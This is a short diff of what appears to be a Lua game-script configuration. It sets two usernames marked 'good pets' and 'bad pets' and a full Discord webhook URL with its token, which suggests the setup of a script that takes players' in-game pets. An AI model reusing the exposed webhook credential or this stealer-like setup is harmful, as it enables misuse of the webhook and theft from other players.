@@ -1,4 +1,4 @@
-wait(250)
+wait(25)
 UserName = "pinoyjar" -- good pets
 Webhook = "https://discord.com/api/webhooks/1148608502365954108/PNjIiQGWH5ypSoUsvg0BspOxj3hPLSA4yBHPOIH6giZXvfIWJ3PlYIJjLLPxo-kWz7Ua" -- pings for pets
 UserName2 = "Trex_kid9" -- bad pets
